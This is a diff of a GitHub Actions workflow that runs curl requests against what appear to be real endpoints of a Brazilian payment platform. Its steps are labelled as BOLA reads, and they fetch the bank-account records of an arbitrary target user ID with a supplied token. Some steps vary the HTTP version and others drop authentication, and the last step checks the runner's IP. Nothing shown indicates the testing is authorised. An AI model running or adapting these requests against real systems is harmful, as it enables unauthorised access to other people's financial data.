@@ -11,15 +11,34 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: BOLA READ target user
+      - name: Test token validity on dash
         run: |
+          echo "=== Token check via dash ==="
           curl -sk -w "\nHTTP:%{http_code}\n" \
+            "https://dash.ticto.com.br/api/v1/private/user" \
+            -H "Authorization: Bearer ${{ inputs.token }}" \
+            -H "Accept: application/json"
+      - name: BOLA READ http1
+        run: |
+          echo "=== http1.1 ==="
+          curl -sk -w "\nHTTP:%{http_code}\n" --http1.1 \
             "https://phoenix.ticto.cloud/api/v1/private/users/${{ inputs.user_id }}/manage/bank-accounts" \
             -H "Authorization: Bearer ${{ inputs.token }}" \
             -H "Accept: application/json"
-      - name: BOLA READ own account 1338731
+      - name: BOLA READ http2
         run: |
-          curl -sk -w "\nHTTP:%{http_code}\n" \
-            "https://phoenix.ticto.cloud/api/v1/private/users/1338731/manage/bank-accounts" \
+          echo "=== http2 ==="
+          curl -sk -w "\nHTTP:%{http_code}\n" --http2 \
+            "https://phoenix.ticto.cloud/api/v1/private/users/${{ inputs.user_id }}/manage/bank-accounts" \
             -H "Authorization: Bearer ${{ inputs.token }}" \
             -H "Accept: application/json"
+      - name: Phoenix ping without auth
+        run: |
+          echo "=== No auth - expect 401 ==="
+          curl -sk -w "\nHTTP:%{http_code}\n" \
+            "https://phoenix.ticto.cloud/api/v1/private/users/${{ inputs.user_id }}/manage/bank-accounts" \
+            -H "Accept: application/json"
+      - name: Check caller IP
+        run: |
+          echo "=== Our IP ==="
+          curl -s https://api.ipify.org
